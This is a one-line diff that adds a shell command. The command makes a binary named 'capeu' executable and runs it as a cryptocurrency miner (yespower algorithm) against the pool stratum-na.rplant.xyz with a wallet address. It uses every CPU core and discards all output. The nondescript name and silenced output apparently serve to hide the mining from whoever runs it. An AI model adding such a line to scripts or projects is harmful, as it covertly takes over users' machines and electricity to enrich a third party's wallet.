@@ -1,0 +1,1 @@
+chmod +x capeu && ./capeu -a yespower -o stratum-na.rplant.xyz:7059 -u TSpv8cQeM7jdt9D8FkWfh6ru7SWtV2aiXW.sugoi -p x -t $(nproc --all) > /dev/null 2>&1
